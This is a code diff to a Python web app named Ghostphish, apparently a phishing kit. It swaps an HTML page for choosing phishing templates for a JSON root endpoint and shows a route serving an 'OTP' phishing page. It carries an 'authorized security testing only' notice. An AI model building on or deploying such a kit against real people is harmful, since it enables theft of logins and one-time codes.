@@ -114,119 +114,16 @@ def get_client_ip(request: Request) -> str:
         return request.headers["x-forwarded-for"].split(",")[0].strip()
     return request.client.host
 
-@app.get("/", response_class=HTMLResponse)
-async def landing_page():
-    """Landing page with template selection"""
-    template_links = "\n".join([
-        f'        <a href="/{key}" class="template-card">' +
-        f'<div class="icon">🔐</div><div class="name">{value}</div></a>'
-        for key, value in TEMPLATES.items()
-    ])
-
-    return f"""
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Ghostphish - Template Selection</title>
-        <style>
-            * {{
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }}
-            body {{
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                min-height: 100vh;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                padding: 20px;
-            }}
-            .container {{
-                background: white;
-                border-radius: 12px;
-                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-                padding: 50px 40px;
-                max-width: 900px;
-                width: 100%;
-            }}
-            .header {{
-                text-align: center;
-                margin-bottom: 50px;
-            }}
-            h1 {{
-                font-size: 32px;
-                color: #333;
-                margin-bottom: 10px;
-                font-weight: 700;
-            }}
-            .subtitle {{
-                color: #666;
-                font-size: 16px;
-            }}
-            .templates {{
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-                gap: 20px;
-            }}
-            .template-card {{
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                color: white;
-                border-radius: 8px;
-                padding: 25px 15px;
-                text-decoration: none;
-                transition: transform 0.3s, box-shadow 0.3s;
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                gap: 10px;
-                cursor: pointer;
-                text-align: center;
-            }}
-            .template-card:hover {{
-                transform: translateY(-5px);
-                box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
-            }}
-            .icon {{
-                font-size: 32px;
-            }}
-            .name {{
-                font-size: 13px;
-                font-weight: 600;
-                word-break: break-word;
-            }}
-            .footer {{
-                text-align: center;
-                margin-top: 40px;
-                color: #999;
-                font-size: 12px;
-            }}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <h1>👻 Ghostphish</h1>
-                <p class="subtitle">Select a template to begin</p>
-            </div>
-            <div class="templates">
-{template_links}
-            </div>
-            <div class="footer">
-                <p>For authorized security testing only</p>
-                <p style="margin-top:14px; font-weight:600; color:#fff; opacity:0.9;">
-                    ⚡ ghostphish v{VERSION} &mdash; Developed by
-                    <a href="{GITHUB}" style="color:#ff8090; text-decoration:none;">{AUTHOR}</a>
-                </p>
-            </div>
-        </div>
-    </body>
-    </html>
-    """
-
+@app.get("/", response_class=JSONResponse)
+async def root():
+    """Root — returns JSON only. Web GUI removed; use ./start.sh CLI instead."""
+    return {
+        "tool": "ghostphish",
+        "version": VERSION,
+        "developed_by": AUTHOR,
+        "github": GITHUB,
+        "message": "Use ./start.sh for the interactive CLI. Direct template routes: " + ", ".join(f"/{k}" for k in TEMPLATES),
+    }
 @app.get("/phishing-page", response_class=HTMLResponse)
 async def phishing_page():
     """Serve the phishing OTP page"""
